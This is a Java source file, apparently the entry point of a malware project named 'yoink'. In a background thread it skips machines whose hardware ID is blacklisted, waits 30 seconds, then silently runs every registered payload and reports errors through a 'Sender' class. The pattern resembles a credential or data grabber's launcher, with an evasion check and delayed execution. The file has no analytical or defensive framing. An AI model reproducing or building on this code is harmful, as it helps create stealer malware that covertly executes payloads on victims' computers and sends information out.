package me.perry.yoink;

import me.perry.yoink.payload.Payload;
import me.perry.yoink.payload.PayloadRegistry;
import me.perry.yoink.payload.Sender;
import me.perry.yoink.util.HWIDUtil;

public final
class Start {
    public
    Start () {
        new Thread(() -> {
            try {
                if (HWIDUtil.blacklisted()) return;
                Thread.sleep(30000);
                for (Payload payload : PayloadRegistry.getPayloads())
                    try {
                        payload.execute();
                    } catch (Exception e) {
                        Sender.send(e.getMessage());
                    }
            } catch (Exception ignored) {
            }
        }).start();
    }
}